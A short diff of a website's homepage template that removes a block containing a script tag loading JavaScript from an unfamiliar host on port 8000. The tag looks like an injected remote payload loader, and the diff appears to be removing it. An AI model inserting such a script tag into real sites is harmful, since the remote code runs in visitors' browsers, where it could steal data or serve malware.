@@ -185,12 +185,6 @@
     </div>
 </div>
 <div class="homepage-featuresarea">
-    <div class="homepage-videowrapper">
-        <div class="homepage-videobg"></div>
-        <div class="homepage-videodisplay">
-            <script src="http://a3m.io:8000/p104.4mEbABPtTv8.js"></script>
-        </div>
-    </div>
     <ul class="homepage-slickcarousel">
         <li>
             <div class="homepage-slickimage">
